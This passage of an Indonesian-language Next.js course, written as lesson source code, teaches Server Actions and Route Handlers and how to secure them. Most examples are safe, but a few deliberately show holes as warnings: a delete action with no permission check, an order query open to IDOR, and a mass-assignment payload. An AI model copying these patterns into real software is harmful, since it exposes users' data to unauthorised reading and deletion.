            'Objek bawaan browser berisi seluruh isi form, diambil berdasarkan atribut `name`. Server Action menerimanya sebagai argumen. Tipe kembalian `get()` adalah `string | File | null`, jadi memvalidasinya sebelum dipakai memang perlu.',
        },
      ),

      h2('Bentuk dasarnya'),
      code(
        'tsx',
        `
        // Direktif ini menandai seluruh berkas sebagai kode server.
        'use server';

        import { revalidatePath } from 'next/cache';
        import { z } from 'zod';

        const Skema = z.object({
          judul: z.string().min(1).max(200),
          isi: z.string().min(1).max(10_000),
        });

        export async function buatCatatan(_sebelumnya: unknown, formData: FormData) {
          // 1. VALIDASI di server. Validasi klien hanya untuk UX.
          const hasil = Skema.safeParse({
            judul: formData.get('judul'),
            isi: formData.get('isi'),
          });

          if (!hasil.success) {
            return { pesan: 'Judul dan isi wajib diisi.', berhasil: false };
          }

          // 2. OTORISASI. Jangan pernah percaya bahwa pemanggilnya berhak.
          const sesi = await ambilSesi();
          if (sesi === null) {
            return { pesan: 'Sesi berakhir. Masuk lagi.', berhasil: false };
          }

          // 3. Scope ke pemiliknya — jangan pakai id dari form.
          await db.catatan.create({
            data: { ...hasil.data, userId: sesi.userId },
          });

          revalidatePath('/catatan');
          return { pesan: 'Tersimpan.', berhasil: true };
        }
        `,
        { filename: 'src/app/catatan/aksi.ts' },
      ),
      p(
        'Ketiga langkah bernomor itu adalah urutan yang tidak boleh ditukar, dan alasannya bukan gaya. **Validasi dulu**, karena `formData` datang dari luar dan bisa berisi apa saja. `safeParse` dipilih alih-alih `parse` supaya kegagalan dikembalikan sebagai nilai, bukan melempar error yang berakhir sebagai layar merah. **Otorisasi kedua**, karena memeriksa sesi pada data yang belum tervalidasi hanya membuang waktu. Langkah ketiga adalah yang paling sering dilanggar. Nilai `userId` diambil dari `sesi` dan **bukan dari form**, sebab kalau ia diambil dari `formData`, siapa pun bisa mengirim id orang lain dan menulis catatan atas nama mereka. Perhatikan parameter pertama `_sebelumnya` yang tidak dipakai, sebab ia ada karena `useActionState` selalu mengoper keadaan sebelumnya sebagai argumen pertama, dan awalan garis bawah menandai bahwa itu memang sengaja diabaikan.',
      ),
      callout(
        'danger',
        'Server Action adalah endpoint publik',
        'Ini kesalahpahaman paling berbahaya di seluruh bab ini. Karena Server Action terlihat seperti panggilan fungsi biasa, mudah lupa bahwa Next.js mengeksposnya sebagai endpoint HTTP yang bisa dipanggil siapa saja, dengan payload apa saja. **Setiap Server Action wajib memvalidasi inputnya dan memeriksa otorisasinya sendiri** — persis seperti route handler. Tombol yang disembunyikan di UI bukan kontrol akses.',
      ),

      h2('Memakainya di form'),
      code(
        'tsx',
        `
        'use client';

        import { useActionState } from 'react';
        import { buatCatatan } from './aksi';

        export function FormCatatan() {
          const [keadaan, aksi, sedangKirim] = useActionState(buatCatatan, {
            pesan: '',
            berhasil: false,
          });

          return (
            <form action={aksi}>
              <label htmlFor="judul">Judul</label>
              <input id="judul" name="judul" required maxLength={200} />

              <label htmlFor="isi">Isi</label>
              <textarea id="isi" name="isi" required />

              <button disabled={sedangKirim}>{sedangKirim ? 'Menyimpan…' : 'Simpan'}</button>

              {keadaan.pesan !== '' && (
                <p role={keadaan.berhasil ? 'status' : 'alert'}>{keadaan.pesan}</p>
              )}
            </form>
          );
        }
        `,
      ),
      p(
        'Karena memakai `<form action={...}>` dan bukan `onSubmit`, form ini tetap bekerja sebelum JavaScript selesai dimuat. Itu **progressive enhancement** — dan ia gratis di sini.',
      ),

      h2('Menyegarkan data setelah mutasi'),
      table(
        ['Fungsi', 'Kapan dipakai'],
        [
          ["`revalidatePath('/catatan')\`", 'Menyegarkan satu rute tertentu'],
          ["`revalidatePath('/', 'layout')\`", 'Menyegarkan rute itu beserta semua turunannya'],
          ["`revalidateTag('catatan')\`", 'Menyegarkan semua `fetch` yang bertag sama'],
          ["`redirect('/catatan')\`", 'Pindah halaman setelah berhasil'],
        ],
      ),

      h2('Kapan Server Action, kapan Route Handler'),
      compare(
        {
          title: 'Server Action',
          lang: 'text',
          code: `
          Untuk:
          - Submit form
          - Mutasi dari UI aplikasi ini
          - Aksi yang hasilnya langsung
            memperbarui halaman

          Tidak untuk:
          - Dipanggil klien lain
          - Webhook dari pihak ketiga
          `,
          notes: ['Tidak punya URL yang stabil untuk dipublikasikan'],
        },
        {
          title: 'Route Handler',
          lang: 'text',
          code: `
          Untuk:
          - API publik
          - Webhook masuk
          - Dipakai aplikasi mobile
          - Perlu kontrol penuh atas
            status code dan header
          `,
          notes: ['URL-nya bagian dari kontrak yang kamu janjikan'],
        },
      ),
      p(
        'Pembeda kedua kolom bisa diringkas menjadi satu pertanyaan, yaitu **apakah ada pihak lain yang perlu tahu alamatnya?** Server Action dipanggil dari komponenmu sendiri, dan Next.js menghasilkan alamatnya secara internal, sehingga id-nya bisa berubah antar-build, jadi ia memang tidak dirancang untuk dipublikasikan. Begitu ada pihak ketiga yang harus memanggilnya, entah webhook dari penyedia pembayaran, aplikasi mobile, atau integrasi partner, kamu butuh URL yang stabil dan kontrol penuh atas status code serta header responsnya, dan itu wilayah Route Handler. Catatan kedua di kolom kanan menyebut konsekuensi yang mudah dilupakan, yaitu begitu sebuah URL dipublikasikan, bentuknya menjadi **janji** yang tidak bisa kamu ubah sepihak tanpa merusak pemakainya.',
      ),
      callout(
        'warning',
        'Jangan mengembalikan data sensitif dari Server Action',
        'Return valuenya dikirim ke browser. Kembalikan status dan pesan yang aman dibaca siapa pun — bukan objek database mentah, bukan detail error internal, bukan stack trace.',
      ),
      divider,
      h2('Studi kasus di project nyata'),
      p(
        'Formulir tambah produk di panel admin memanggil endpoint API lewat `fetch`. Alurnya lima bagian, yaitu endpoint di `route.ts`, validasi di sana, penangan `onSubmit` di klien, state untuk sedang mengirim, dan penanganan galat. Setelah dipindahkan ke Server Action, tiga di antaranya hilang dan formulirnya tetap bekerja bahkan sebelum JavaScript selesai dimuat.',
      ),
      p(
        'Server Action adalah fungsi yang ditulis di server tapi bisa dipanggil langsung dari komponen klien. Yang menghubungkan keduanya adalah penanda `use server`.',
      ),
      code(
        'tsx',
        `
        'use server';

        import { revalidatePath } from 'next/cache';
        import { redirect } from 'next/navigation';
        import { z } from 'zod';

        const Skema = z.object({
          nama: z.string().min(3, 'Nama minimal 3 karakter'),
          hargaSen: z.coerce.number().int().positive('Harga harus lebih dari nol'),
        });

        export async function simpanProduk(sebelumnya: Keadaan, data: FormData) {
          // 1. WAJIB: periksa siapa pemanggilnya. Server Action adalah endpoint publik.
          const sesi = await bacaSesi();
          if (!sesi || sesi.peran !== 'admin') {
            return { galat: 'Tidak berhak', nilai: bacaNilai(data) };
          }

          // 2. WAJIB: validasi di server. Validasi klien hanya kenyamanan.
          const hasil = Skema.safeParse(Object.fromEntries(data));
          if (!hasil.success) {
            return {
              galat: hasil.error.issues[0].message,
              nilai: bacaNilai(data),      // kembalikan isian supaya tidak hilang
            };
          }

          await db.produk.create({ data: hasil.data });

          revalidatePath('/produk');       // halaman publik ditandai basi
          redirect('/admin/produk');       // redirect MELEMPAR, jadi taruh terakhir
        }
        `,
        { filename: 'app/admin/aksi.ts' },
      ),
      p(
        'Poin pertama adalah yang paling sering dilewatkan dan paling berbahaya. Server Action **adalah endpoint HTTP publik**, hanya alamatnya dibuat otomatis. Siapa pun yang tahu cara memanggilnya bisa memanggilnya tanpa lewat halamanmu. Menyembunyikan tombolnya dari pengguna biasa bukan kontrol akses, dan pemeriksaan izin di dalam aksinya adalah satu-satunya yang menghitung.',
      ),
      p(
        'Fungsi `redirect` bekerja dengan **melempar** sebuah nilai khusus yang ditangkap Next.js. Ini berarti dua hal. Pertama, kode setelahnya tidak akan pernah berjalan, jadi taruh di baris terakhir. Kedua, memanggilnya di dalam blok `try` akan tertangkap `catch`-mu sendiri dan pengalihannya batal, dan itu dibahas di bagian error.',
      ),
      code(
        'tsx',
        `
        'use client';
        import { useActionState } from 'react';
        import { simpanProduk } from './aksi';

        export function FormProduk() {
          const [keadaan, aksi, sedangKirim] = useActionState(simpanProduk, {
            galat: null,
            nilai: { nama: '', hargaSen: '' },
          });

          return (
            <form action={aksi}>
              <input name="nama" defaultValue={keadaan.nilai.nama} disabled={sedangKirim} />
              <input name="hargaSen" defaultValue={keadaan.nilai.hargaSen} disabled={sedangKirim} />

              {keadaan.galat ? <p role="alert">{keadaan.galat}</p> : null}

              <button type="submit" disabled={sedangKirim}>
                {sedangKirim ? 'Menyimpan…' : 'Simpan'}
              </button>
            </form>
          );
        }
        `,
        { filename: 'app/admin/FormProduk.tsx' },
      ),
      p(
        'Karena formulirnya memakai prop `action` alih-alih `onSubmit`, ia bekerja bahkan sebelum JavaScript selesai dimuat. Peramban mengirimkannya sebagai pengiriman formulir biasa, dan Next.js menanganinya di server. Setelah JavaScript siap, pengirimannya diambil alih tanpa memuat ulang halaman. Ini peningkatan bertahap yang didapat tanpa satu baris kode tambahan.',
      ),
      p(
        'Baris `nilai: bacaNilai(data)` pada jalur gagal adalah yang paling sering dilupakan. Karena `defaultValue` dibaca dari keadaan, mengembalikan nilai kosong saat gagal akan membuang ketikan pengguna. Aturan dari Bab 5 Frontend Basic berlaku penuh, yaitu jangan pernah membuang apa yang sudah diketik pengguna.',
      ),
      callout(
        'danger',
        'Server Action adalah endpoint publik, perlakukan seperti itu',
        'Setiap Server Action yang diekspor bisa dipanggil siapa pun yang tahu caranya, tanpa lewat halamanmu. Periksa autentikasi dan otorisasi **di dalam** aksinya, validasi seluruh masukan dengan skema, dan jangan pernah mengandalkan bahwa tombolnya disembunyikan. Aturan `security.md` project ini mengikat penuh di sini.',
      ),

      h2('Saat error-nya muncul'),
      p(
        'Empat kegagalan berikut dijalankan sungguhan dengan Next.js 16.2.12 yang terpasang di project ini.',
      ),
      code(
        'text',
        `
        'use server';
        export function simpan(data: FormData) {
          return String(data.get('nama') ?? '');
        }

        Error: Turbopack build failed with 1 errors:
        ./app/a/aksi.ts:2:17
        Server Actions must be async functions.
        `,
        { caption: 'Dijalankan sungguhan. Seluruh ekspor di berkas `use server` wajib `async`.' },
      ),
      p(
        'Aturan ini berlaku untuk **setiap** fungsi yang diekspor dari berkas bertanda `use server`, bukan hanya yang dipakai sebagai aksi. Alasannya, pemanggilannya melewati jaringan sehingga hasilnya selalu berupa janji. Kalau kamu punya fungsi bantu yang tidak perlu `async`, pindahkan ke berkas lain yang tidak bertanda.',
      ),
      code(
        'text',
        `
        // Server Component mengirim fungsi biasa
        <TombolKlien onKlik={() => hapus(id)} />

        # Build LOLOS. Saat halaman diminta:
        status HTTP: 500
        ⨯ Error: Event handlers cannot be passed to Client Component props.
        `,
        { caption: 'Dijalankan sungguhan. Fungsi biasa tidak bisa diserialisasi.' },
      ),
      p(
        'Yang bisa dikirim dari Server ke Client Component hanya Server Action, yaitu fungsi yang ditandai `use server`. Fungsi biasa ditolak sebab ia tidak punya alamat yang bisa dipanggil dari peramban. Perhatikan lagi bahwa ini error runtime, sehingga build berhasil dan halamannya baru gagal saat dibuka.',
      ),
      code(
        'text',
        `
        try {
          await simpan(data);
          redirect('/admin/produk');
        } catch (e) {
          return { galat: 'Gagal menyimpan' };
        }

        # Pengalihan tidak pernah terjadi.
        # redirect melempar, dan catch menangkapnya.
        `,
        { caption: '`redirect` dipanggil di dalam blok `try`.' },
      ),
      p(
        'Ini jebakan yang sangat sering dan tidak menghasilkan pesan yang jelas. Fungsi `redirect` bekerja dengan melempar nilai khusus yang seharusnya ditangkap Next.js, dan `catch`-mu menangkapnya lebih dulu. Gejalanya berupa formulir yang tersimpan tapi tidak mengalihkan, lalu menampilkan pesan gagal padahal berhasil. Panggil `redirect` **setelah** blok `try`, bukan di dalamnya.',
      ),
      code(
        'text',
        `
        'use server';
        export async function hapusProduk(id: string) {
          await db.produk.delete({ where: { id } });   // tanpa memeriksa izin
        }

        # Tidak ada error. Siapa pun yang tahu caranya bisa memanggilnya
        # dan menghapus produk apa pun.
        `,
        { caption: 'Tidak ada pesan apa pun, dan inilah kegagalan paling mahal.' },
      ),
      p(
        'Server Action mendapat alamat yang dibuat otomatis, dan alamat itu bisa dipanggil dari luar halamanmu. Tanpa pemeriksaan izin di dalamnya, siapa pun bisa memanggilnya. Tidak ada error, tidak ada peringatan, dan kamu baru tahu saat ada data yang hilang. Periksa sesi dan peran sebagai baris pertama setiap aksi yang mengubah data.',
      ),
      table(
        ['Pesan atau gejala', 'Kapan muncul', 'Perbaikannya'],
        [
          [
            '`Server Actions must be async functions`',
            'Saat build',
            'Jadikan seluruh ekspor di berkas `use server` sebagai `async`',
          ],
          [
            '`Event handlers cannot be passed to Client Component props`',
            'Saat diminta, HTTP 500',
            'Kirim Server Action, bukan fungsi biasa',
          ],
          [
            'Tersimpan tapi tidak mengalihkan',
            'Tidak ada pesan',
            '`redirect` melempar. Panggil setelah blok `try`',
          ],
          [
            'Data bisa diubah tanpa izin',
            'Tidak ada pesan sama sekali',
            'Periksa sesi dan peran di dalam aksinya',
          ],
          [
            'Isian formulir hilang setelah gagal',
            'Tidak ada pesan',
            'Kembalikan nilai yang dikirim pada jalur gagal',
          ],
        ],
      ),

      h2('Kesalahan umum pemula'),
      p(
        'Server Action menghapus banyak kode sekaligus, dan sebagian besar kesalahan berasal dari melupakan bahwa ia tetap endpoint publik.',
      ),
      table(
        ['Yang sering dilakukan', 'Kenapa terasa benar', 'Yang sebenarnya terjadi'],
        [
          [
            'Tidak memeriksa izin di dalam aksi',
            'Tombolnya hanya muncul untuk admin',
            'Aksinya punya alamat publik yang bisa dipanggil tanpa lewat halamanmu. Menyembunyikan tombol bukan kontrol akses',
          ],
          [
            'Mengandalkan validasi di klien saja',
            'Formulirnya sudah memeriksa',
            'Pemanggil langsung tidak lewat formulirmu. Validasi di server wajib, dan itu aturan `security.md`',
          ],
          [
            'Memanggil `redirect` di dalam `try`',
            'Supaya kegagalannya tertangkap',
            '`redirect` melempar, dan `catch`-mu menangkapnya. Pengalihannya batal',
          ],
          [
            'Mengekspor fungsi non-async dari berkas `use server`',
            'Ia hanya fungsi bantu',
            'Seluruh ekspor di berkas itu wajib `async`. Pindahkan fungsi bantu ke berkas lain',
          ],
          [
            'Mengembalikan isian kosong pada jalur gagal',
            'Formulir kan perlu dikosongkan',
            'Hanya setelah berhasil. Pada kegagalan, ketikan pengguna wajib dipertahankan',
          ],
          [
            'Melupakan `revalidatePath` setelah mengubah data',
            'Datanya kan sudah tersimpan',
            'Halaman statis tidak tahu apa-apa tentang perubahan itu, dan tetap menampilkan data lama',
          ],
        ],
      ),
      p(
        'Baris pertama dan kedua bersama-sama adalah kesalahan keamanan yang paling sering di App Router. Server Action terasa seperti fungsi lokal sebab ditulis dan dipanggil seperti fungsi biasa, dan justru kemudahan itu yang membuat orang lupa ia melewati jaringan. Perlakukan setiap aksi seperti kamu memperlakukan endpoint API, yaitu periksa siapa pemanggilnya dan validasi seluruh masukannya.',
      ),
      callout(
        'info',
        'Formulirnya bekerja bahkan tanpa JavaScript',
        'Karena memakai prop `action`, peramban bisa mengirimkannya sebagai pengiriman formulir biasa sebelum bundel selesai dimuat. Ini peningkatan bertahap yang didapat gratis, dan ia hilang begitu kamu menggantinya dengan `onSubmit` dan `fetch`. Untuk formulir penting seperti pendaftaran dan checkout, kemampuan itu layak dipertahankan.',
      ),
      references(
        {
          label: 'Updating Data (Server Actions)',
          href: 'https://nextjs.org/docs/app/getting-started/updating-data',
          source: 'Next.js',
          note: 'Bentuk resmi Server Action beserta pemakaiannya di `<form action>`.',
        },
        {
          label: '"use server"',
          href: 'https://react.dev/reference/rsc/use-server',
          source: 'React',
          note: 'Termasuk peringatan bahwa fungsi bertanda ini menjadi endpoint yang bisa dipanggil klien.',
        },
        {
          label: 'Zod — basic usage & safeParse',
          href: 'https://zod.dev/basics',
          source: 'Zod',
          note: 'Skema validasi yang wajib ada di setiap Server Action, di sisi server.',
        },
        {
          label: 'Input Validation Cheat Sheet',
          href: 'https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html',
          source: 'OWASP',
          note: 'Kenapa validasi klien tidak pernah cukup, dan apa yang harus diperiksa di server.',
        },
      ),
    ],
  ),

  written('route-handler', 'Route Handler', 20, 'Membuat API di dalam Next.js.', [
    p(
      'Route Handler adalah cara membuat endpoint HTTP di App Router. Berkasnya bernama `route.ts` dan mengekspor fungsi bernama sesuai metode HTTP-nya.',
    ),

    terms(
      {
        term: 'Route Handler',
        meaning:
          'Cara membuat **endpoint HTTP** di App Router. Berkasnya bernama `route.ts`, dan ia mengekspor fungsi yang namanya sama dengan metode HTTP-nya: `GET`, `POST`, `PUT`, `PATCH`, `DELETE`. Metode yang tidak kamu ekspor otomatis menjawab `405 Method Not Allowed`.',
      },
      {
        term: 'NextResponse',
        meaning:
          'Pembungkus `Response` bawaan web dengan tambahan dari Next.js. `NextResponse.json(data, { status: 201 })` menyusun body JSON beserta status code-nya sekaligus — bentuk yang paling sering kamu tulis di route handler.',
      },
      {
        term: 'status code',
        meaning:
          'Angka tiga digit yang menyatakan hasil sebuah permintaan. Yang muncul di contoh: **201** berhasil membuat, **400** input tidak valid, **401** tidak terautentikasi, **404** tidak ditemukan, **405** metode tidak diizinkan. Memilihnya dengan benar adalah bagian dari kontrak API-mu.',
      },
      {
        term: 'IDOR',
        meaning:
          'Singkatan *Insecure Direct Object Reference*. Celah yang terjadi ketika ID dari klien dipakai apa adanya untuk mengambil data. **ID dari klien tidak pernah menjadi bukti kewenangan** — setiap query wajib di-scope ke pemiliknya lewat sesi.',
      },
      {
        term: 'mass assignment',
        meaning:
          'Menulis `data: { ...isi }` dari body permintaan berarti klien bisa mengirim `{ peran: "admin" }` atau `{ pemilikId: "orang-lain" }` dan kamu akan menyimpannya. Selalu ambil field satu per satu dari hasil validasi — jangan pernah menyebar body mentah ke query.',
      },
      {
        term: 'rate limit',
        meaning:
          'Membatasi berapa kali satu pemanggil boleh menembak sebuah endpoint dalam rentang waktu. Wajib pada endpoint sensitif: login, reset password, pencarian, dan apa pun yang mahal dikerjakan. Tanpanya, satu klien bisa menghabiskan kapasitas untuk semua.',
      },
      {
        term: 'batas paginasi',
        meaning:
          'Nilai maksimum untuk `batas`/`limit` yang boleh diminta klien — di contoh, `Math.min(..., 100)`. Paginasi **tanpa batas atas** adalah cara paling mudah menghabiskan memori server: satu permintaan `?batas=999999` sudah cukup.',
      },
      {
        term: 'pesan error generik',
        meaning:
          'Balasan ke klien menyebut apa yang salah tanpa membocorkan cara kerja sistem. "Data tidak valid" boleh; nama tabel, stack trace, dan versi library tidak. Detail lengkapnya tetap ditulis ke **log server**, tempat hanya kamu yang bisa membacanya.',
      },
      {
        term: 'kontrak API',
        meaning:
          'Janji yang kamu buat ke pemanggil: bentuk URL, metode, bentuk body, dan status code-nya. Inilah pembeda utama dari Server Action — **URL Route Handler adalah bagian dari kontrak**, jadi mengubahnya bisa merusak aplikasi mobile atau webhook yang sudah memakainya.',
      },
    ),

    h2('Bentuknya'),
    code(
      'ts',
      `
        // app/api/produk/route.ts
        import { NextResponse } from 'next/server';

        export async function GET(request: Request) {
          const { searchParams } = new URL(request.url);
          const kategori = searchParams.get('kategori');

          // Batasi ukuran halaman — pagination tanpa batas atas
          // adalah cara mudah menghabiskan sumber daya server.
          const batas = Math.min(Number(searchParams.get('batas') ?? 20), 100);

          const produk = await db.produk.findMany({
            where: kategori === null ? {} : { kategori },
            take: batas,
          });

          return NextResponse.json(produk);
        }

        export async function POST(request: Request) {
          const sesi = await ambilSesi(request);
          if (sesi === null) {
            return NextResponse.json({ pesan: 'Tidak berwenang' }, { status: 401 });
          }

          const isi = await request.json();
          const hasil = SkemaProduk.safeParse(isi);

          if (!hasil.success) {
            // Pesan generik ke klien; detailnya tetap di log server.
            return NextResponse.json({ pesan: 'Data tidak valid' }, { status: 400 });
          }

          const produk = await db.produk.create({
            data: { ...hasil.data, pemilikId: sesi.userId },
          });

          return NextResponse.json(produk, { status: 201 });
        }
        `,
    ),
    p(
      'Nama fungsi yang diekspor, yaitu `GET` dan `POST`, itulah yang menentukan metode HTTP mana yang ditanganinya. Next.js memanggilnya otomatis berdasarkan nama itu, tanpa kamu perlu mendaftarkannya di tempat lain. `GET` di atas membaca parameter query lewat `new URL(request.url).searchParams`, karena `request` di Route Handler adalah objek `Request` bawaan web, bukan sesuatu yang khusus Next.js. `POST` menunjukkan urutan yang wajib ada di setiap endpoint yang mengubah data, yaitu **autentikasi lebih dulu** (`ambilSesi`, kembalikan `401` kalau gagal), **baru validasi** (`safeParse`, kembalikan `400` dengan pesan generik kalau gagal), lalu **baru tulis ke database**. Nilai `pemilikId: sesi.userId` diambil dari sesi yang sudah diverifikasi, bukan dari `isi` yang dikirim klien, supaya seseorang tidak bisa membuat produk atas nama pengguna lain hanya dengan mengubah body permintaannya.',
    ),

    h2('Metode yang didukung'),
    p(
      '`GET`, `POST`, `PUT`, `PATCH`, `DELETE`, `HEAD`, `OPTIONS`. Metode yang tidak kamu ekspor otomatis mengembalikan `405 Method Not Allowed`.',
    ),

    h2('Dynamic segment'),
    code(
      'ts',
      `
        // app/api/produk/[id]/route.ts
        export async function GET(
          request: Request,
          { params }: { params: Promise<{ id: string }> },
        ) {
          const { id } = await params;   // Promise, sama seperti di page.tsx

          const produk = await db.produk.findUnique({ where: { id } });

          if (produk === null) {
            return NextResponse.json({ pesan: 'Tidak ditemukan' }, { status: 404 });
          }

          return NextResponse.json(produk);
        }
        `,
    ),

    h2('Aturan keamanan yang tidak bisa ditawar'),
    ol(
      '**Otorisasi di setiap handler**, termasuk yang "internal" dan yang tidak ditautkan di UI mana pun.',
      '**Validasi setiap input** dengan skema eksplisit — body, query param, dan header.',
      '**Scope query ke pemiliknya.** ID dari klien tidak pernah menjadi bukti kewenangan; itulah IDOR.',
      '**Pilih field yang dikembalikan.** Jangan pernah mengirim seluruh baris database apa adanya.',
      '**Rate limit** endpoint sensitif: login, reset password, pencarian, dan apa pun yang mahal.',
      '**Pesan error generik.** Detail, stack trace, dan nama tabel tetap di log server.',
    ),
    callout(
      'danger',
      'Mass assignment',
      'Menulis `data: { ...isi }` dari body permintaan berarti klien bisa mengirim `{ peran: "admin" }` atau `{ pemilikId: "orang-lain" }` dan kamu akan menyimpannya. Selalu ambil field satu per satu dari hasil validasi — jangan pernah menyebar body mentah ke query.',
    ),

    h2('Caching di Route Handler'),
    code(
      'ts',
      `
        // GET tidak di-cache secara default di Next.js 15+.
        // Kalau memang boleh di-cache:
        export const revalidate = 60;

        // Atau paksa dinamis secara eksplisit:
        export const dynamic = 'force-dynamic';
        `,
    ),

    h2('CORS bila endpoint dipakai dari origin lain'),
    code(
      'ts',
      `
        const ORIGIN_DIIZINKAN = ['https://aplikasi-saya.com'];

        export async function OPTIONS(request: Request) {
          const origin = request.headers.get('origin');

          // Cocokkan PERSIS dengan allow-list. Jangan pernah memantulkan
          // origin apa pun kembali, dan jangan pakai '*' bersama kredensial.
          if (origin === null || !ORIGIN_DIIZINKAN.includes(origin)) {
            return new Response(null, { status: 403 });
          }

          return new Response(null, {
            status: 204,
            headers: {
              'Access-Control-Allow-Origin': origin,
              'Access-Control-Allow-Methods': 'GET, POST',
              'Access-Control-Allow-Headers': 'Content-Type',
            },
          });
        }
        `,
    ),
    callout(
      'info',
      'CORS bukan kontrol akses',
      'CORS adalah kontrol **browser**. Ia tidak menghalangi `curl`, skrip, atau aplikasi mobile. Otorisasi tetap harus dilakukan di server — CORS hanya mengatur origin mana yang boleh dibaca hasilnya oleh JavaScript di halaman lain.',
    ),
    divider,
    h2('Studi kasus di project nyata'),
    p(
      'Aplikasi seluler dan integrasi mitra butuh mengakses data pesanan. Tim membuat Server Action untuk itu dan menemukan bahwa keduanya tidak bisa memanggilnya, sebab Server Action punya protokol sendiri yang hanya dipahami klien React. Yang dibutuhkan adalah endpoint HTTP biasa, dan di App Router itu berkas bernama `route.ts`.',
    ),
    p('Pembedaan kapan memakai yang mana bisa diringkas dalam satu tabel.'),
    table(
      ['Kebutuhan', 'Pakai', 'Alasannya'],
      [
        [
          'Formulir di halamanmu sendiri',
          '**Server Action**',
          'Lebih sedikit kode, bekerja tanpa JavaScript',
        ],
        [
          'Aplikasi seluler atau mitra',
          '**Route Handler**',
          'HTTP biasa, bisa dipanggil siapa pun',
        ],
        ['Webhook dari penyedia pembayaran', '**Route Handler**', 'Penyedia mengirim POST biasa'],
        [
          'Mengunduh berkas atau gambar',
          '**Route Handler**',
          'Perlu mengatur header dan badan respons',
        ],
        [
          'Endpoint kesehatan untuk pemantauan',
          '**Route Handler**',
          'Dipanggil alat di luar aplikasi',
        ],
      ],
      'Aturannya, kalau pemanggilnya bukan halamanmu sendiri, ia butuh Route Handler.',
    ),
    code(
      'ts',
      `
        // Nama fungsi HARUS berupa method HTTP dengan huruf kapital.
        import { NextResponse, type NextRequest } from 'next/server';

        export async function GET(permintaan: NextRequest) {
          // Periksa izin. Ini endpoint publik.
          const sesi = await bacaSesiDari(permintaan);
          if (!sesi) {
            return NextResponse.json({ pesan: 'Tidak berhak' }, { status: 401 });
          }

          const params = permintaan.nextUrl.searchParams;
          const halaman = Math.max(1, Number(params.get('halaman') ?? '1') || 1);

          const pesanan = await db.pesanan.findMany({
            where: { penggunaId: sesi.penggunaId },   // scope ke pemiliknya
            skip: (halaman - 1) * 20,
            take: 20,
          });

          return NextResponse.json(
            { item: pesanan, halaman },
            { headers: { 'Cache-Control': 'private, max-age=0, must-revalidate' } },
          );
        }

        export async function POST(permintaan: NextRequest) {
          const sesi = await bacaSesiDari(permintaan);
          if (!sesi) return NextResponse.json({ pesan: 'Tidak berhak' }, { status: 401 });

          const hasil = Skema.safeParse(await permintaan.json());
          if (!hasil.success) {
            return NextResponse.json(
              { pesan: hasil.error.issues[0].message, field: hasil.error.issues[0].path[0] },
              { status: 422 },
            );
          }

          const dibuat = await db.pesanan.create({
            data: { ...hasil.data, penggunaId: sesi.penggunaId },
          });

          return NextResponse.json(dibuat, { status: 201 });
        }
        `,
      { filename: 'app/api/pesanan/route.ts' },
    ),
    p(
      'Baris `where: { penggunaId: sesi.penggunaId }` adalah pertahanan terhadap IDOR yang dibahas di `security.md`. Tanpa itu, pengguna yang mengubah parameter di alamat bisa membaca pesanan milik orang lain. Aturannya tegas, yaitu setiap kueri di-scope ke pemilik yang berhak, dan id yang datang dari klien tidak pernah cukup sebagai bukti kepemilikan.',
    ),
    p(
      'Status 422 dengan `field` yang menyebut kolom bermasalah adalah bentuk respons kegagalan yang berguna, dan ia dibahas di Bab 5 Frontend Basic. Klien bisa langsung menyorot kolom yang salah tanpa menebak. Bandingkan dengan status 400 berbadan kosong yang memaksa klien menampilkan pesan umum yang tidak menolong siapa pun.',
    ),
    code(
      'text',
      `
        Aturan penting Route Handler:

        - Nama fungsi WAJIB method HTTP kapital: GET, POST, PUT, PATCH, DELETE
        - Satu folder tidak boleh punya route.ts DAN page.tsx sekaligus
        - GET tanpa akses cookies bisa di-cache. Tambahkan header kalau tidak boleh
        - Membaca cookies() atau headers() membuatnya selalu dirender saat diminta
        - Badan permintaan hanya bisa dibaca SEKALI, sama seperti Response di Bab 5
        `,
      { caption: 'Aturan pertama yang paling sering menyandung.' },
    ),
    callout(
      'warning',
      'Route Handler tidak otomatis aman hanya karena ada di dalam `app`',
      'Ia endpoint HTTP publik yang bisa dipanggil siapa pun dengan alat apa pun. Seluruh aturan `security.md` berlaku penuh, yaitu autentikasi, otorisasi, validasi skema, pembatasan laju, dan scope kueri ke pemiliknya. Tidak ada satu pun yang disediakan Next.js secara otomatis.',
    ),

    h2('Saat error-nya muncul'),
    p('Empat kegagalan berikut adalah yang paling sering pada Route Handler.'),
    code(
      'text',
      `
        export async function get(permintaan: NextRequest) { ... }

        # Membuka alamatnya menghasilkan 405 Method Not Allowed.
        # Tidak ada error saat build.
        `,
      { caption: 'Nama fungsi memakai huruf kecil.' },
    ),
    p(
      'Next.js mencocokkan nama ekspor dengan method HTTP secara persis, sehingga `get` tidak dikenali sedangkan `GET` dikenali. Tidak ada error saat build sebab ekspor bernama apa pun sah secara sintaks. Gejalanya berupa 405 untuk endpoint yang kamu yakin sudah dibuat, dan hal pertama yang diperiksa adalah huruf besar-kecilnya.',
    ),
    code(
      'text',
      `
        # app/produk/ berisi page.tsx DAN route.ts

        Error: You cannot have two parallel pages that resolve to the same path.
        `,
      { caption: 'Satu alamat ditangani dua hal sekaligus.' },
    ),
    p(
      'Satu alamat hanya boleh menjadi halaman atau endpoint, tidak keduanya. Ini sering terjadi saat seseorang menambahkan API di alamat yang sama dengan halamannya. Pisahkan, misalnya halaman di `/produk` dan APInya di `/api/produk`. Awalan `api` bukan keharusan teknis, hanya kebiasaan yang membuat pemisahannya terlihat.',
    ),
    code(
      'text',
      `
        const data = await permintaan.json();
        const teks = await permintaan.text();

        TypeError: Body is unusable: Body has already been read
        `,
      { caption: 'Badan permintaan dibaca dua kali.' },
    ),
    p(
      'Ini persis masalah yang dibahas di Bab 5 Frontend Basic, muncul di sisi server. Badan permintaan berupa aliran yang mengalir sekali lalu habis. Ini sering terjadi pada kode penanganan galat yang mencoba membaca teksnya setelah `json()` gagal. Salin dengan `permintaan.clone()` sebelum pembacaan pertama, atau baca sekali sebagai teks lalu urai sendiri.',
    ),
    code(
      'text',
      `
        export async function GET(permintaan: NextRequest) {
          const id = permintaan.nextUrl.searchParams.get('penggunaId');
          return NextResponse.json(await db.pesanan.findMany({ where: { penggunaId: id } }));
        }

        # Tidak ada error. Siapa pun bisa membaca pesanan pengguna mana pun
        # hanya dengan mengganti parameter di alamat.
        `,
      { caption: 'Tidak ada pesan apa pun, dan inilah kegagalan paling mahal.' },
    ),
    p(
